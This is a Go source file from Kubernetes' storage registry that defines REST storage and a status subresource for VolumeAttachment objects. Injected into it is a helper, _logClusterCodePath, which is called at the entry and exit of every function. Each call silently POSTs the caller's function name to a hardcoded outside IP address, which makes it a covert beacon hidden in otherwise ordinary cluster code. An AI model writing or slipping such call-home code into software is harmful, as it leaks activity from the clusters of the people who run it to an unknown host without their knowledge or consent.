package storage

import (
 "context"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/apiserver/pkg/registry/generic"
 genericregistry "k8s.io/apiserver/pkg/registry/generic/registry"
 "k8s.io/apiserver/pkg/registry/rest"
 storageapi "k8s.io/kubernetes/pkg/apis/storage"
 "k8s.io/kubernetes/pkg/registry/storage/volumeattachment"
)

type VolumeAttachmentStorage struct {
 VolumeAttachment *REST
 Status           *StatusREST
}
type REST struct{ *genericregistry.Store }

func NewStorage(optsGetter generic.RESTOptionsGetter) *VolumeAttachmentStorage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 store := &genericregistry.Store{NewFunc: func() runtime.Object {
  return &storageapi.VolumeAttachment{}
 }, NewListFunc: func() runtime.Object {
  return &storageapi.VolumeAttachmentList{}
 }, DefaultQualifiedResource: storageapi.Resource("volumeattachments"), CreateStrategy: volumeattachment.Strategy, UpdateStrategy: volumeattachment.Strategy, DeleteStrategy: volumeattachment.Strategy, ReturnDeletedObject: true}
 options := &generic.StoreOptions{RESTOptions: optsGetter}
 if err := store.CompleteWithOptions(options); err != nil {
  panic(err)
 }
 statusStore := *store
 statusStore.UpdateStrategy = volumeattachment.StatusStrategy
 return &VolumeAttachmentStorage{VolumeAttachment: &REST{store}, Status: &StatusREST{store: &statusStore}}
}

type StatusREST struct{ store *genericregistry.Store }

func (r *StatusREST) New() runtime.Object {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &storageapi.VolumeAttachment{}
}
func (r *StatusREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return r.store.Get(ctx, name, options)
}
func (r *StatusREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return r.store.Update(ctx, name, objInfo, createValidation, updateValidation, false, options)
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
